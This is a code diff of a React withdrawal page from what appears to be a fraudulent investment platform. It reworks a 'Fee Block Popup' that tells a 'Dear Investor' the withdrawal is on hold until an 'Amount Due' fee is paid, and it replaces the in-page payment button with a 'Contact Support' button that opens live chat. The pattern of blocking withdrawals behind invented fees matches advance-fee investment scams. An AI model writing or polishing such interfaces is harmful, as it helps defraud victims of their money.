@@ -151,32 +151,27 @@ export default function WithdrawVerifyCode() {
       {/* Fee Block Popup */}
       {feePopup && (
         <>
-          <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.7)', zIndex: 300 }}/>
-          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '32px 24px', width: '320px', textAlign: 'center', borderRadius: '12px', boxShadow: '0 20px 60px rgba(0,0,0,0.4)' }}>
-            <div style={{ width: '56px', height: '56px', borderRadius: '50%', background: 'rgba(239,68,68,0.1)', border: '2px solid #ef4444', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
-              <svg width='24' height='24' fill='none' stroke='#ef4444' strokeWidth='2' viewBox='0 0 24 24'><path d='M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z'/><line x1='12' y1='9' x2='12' y2='13'/><line x1='12' y1='17' x2='12.01' y2='17'/></svg>
+          <div onClick={() => setFeePopup(null)} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 300 }}/>
+          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '36px 28px', width: '320px', textAlign: 'center', borderRadius: '8px' }}>
+            <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #ef4444', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
+              <svg width='22' height='22' fill='none' stroke='#ef4444' viewBox='0 0 24 24' strokeWidth='2'><path d='M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z'/><line x1='12' y1='9' x2='12' y2='13'/><line x1='12' y1='17' x2='12.01' y2='17'/></svg>
             </div>
-            <div style={{ color: '#111', fontSize: '14px', fontWeight: '800', marginBottom: '6px' }}>Action Required</div>
-            <div style={{ color: '#6366f1', fontSize: '12px', fontWeight: '700', marginBottom: '12px' }}>{feePopup.label}</div>
-            <div style={{ background: '#fef2f2', border: '1px solid #fecaca', borderRadius: '8px', padding: '12px', marginBottom: '14px', textAlign: 'left' }}>
-              <div style={{ color: '#555', fontSize: '10px', lineHeight: '1.7' }}>
-                {FEE_DESCRIPTIONS[feePopup.type] || FEE_DESCRIPTIONS.processing}
-              </div>
+            <div style={{ color: '#111', fontSize: '14px', fontWeight: '700', marginBottom: '8px' }}>{feePopup.label}</div>
+            <div style={{ color: '#555', fontSize: '10px', marginBottom: '16px', lineHeight: '1.8' }}>
+              {FEE_DESCRIPTIONS[feePopup.type] || FEE_DESCRIPTIONS.processing}
             </div>
-            <div style={{ background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '8px', padding: '12px', marginBottom: '16px' }}>
-              <div style={{ color: '#888', fontSize: '9px', marginBottom: '4px' }}>Amount Due</div>
-              <div style={{ color: '#ef4444', fontSize: '22px', fontWeight: '800' }}>${parseFloat(feePopup.amount || 0).toLocaleString('en-US', {minimumFractionDigits: 2})}</div>
+            <div style={{ color: '#888', fontSize: '9px', marginBottom: '4px' }}>Amount Due</div>
+            <div style={{ color: '#ef4444', fontSize: '16px', fontWeight: '700', marginBottom: '16px' }}>${parseFloat(feePopup.amount || 0).toLocaleString('en-US', {minimumFractionDigits: 2})}</div>
+            <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.7' }}>
+              Dear Investor, your withdrawal request is on hold. Please contact support to complete this payment.
             </div>
-            <div style={{ color: '#666', fontSize: '9px', marginBottom: '16px', lineHeight: '1.6' }}>
-              Dear Investor, your withdrawal request cannot be processed until this fee is settled. This is a mandatory requirement to complete your transaction.
-            </div>
-            <button onClick={() => handlePayFee(feePopup)} disabled={payingFee}
-              style={{ width: '100%', padding: '12px', background: '#6366f1', border: 'none', color: 'white', fontSize: '11px', fontWeight: '700', cursor: 'pointer', borderRadius: '6px', marginBottom: '8px' }}>
-              {payingFee ? 'Processing...' : `Pay ${feePopup.label} - $${parseFloat(feePopup.amount || 0).toFixed(2)}`}
+            <button onClick={() => { setFeePopup(null); window.dispatchEvent(new Event('openLiveChat')); }}
+              style={{ width: '100%', padding: '10px', background: '#6366f1', border: 'none', color: 'white', fontSize: '10px', fontWeight: '700', cursor: 'pointer', marginBottom: '8px' }}>
+              Contact Support
             </button>
             <button onClick={() => setFeePopup(null)}
-              style={{ width: '100%', padding: '10px', background: 'transparent', border: '1px solid #e2e8f0', color: '#888', fontSize: '11px', cursor: 'pointer', borderRadius: '6px' }}>
-              Cancel
+              style={{ width: '100%', padding: '10px', background: 'transparent', border: '1px solid #e2e8f0', color: '#888', fontSize: '10px', cursor: 'pointer' }}>
+              Close
             </button>
           </div>
         </>
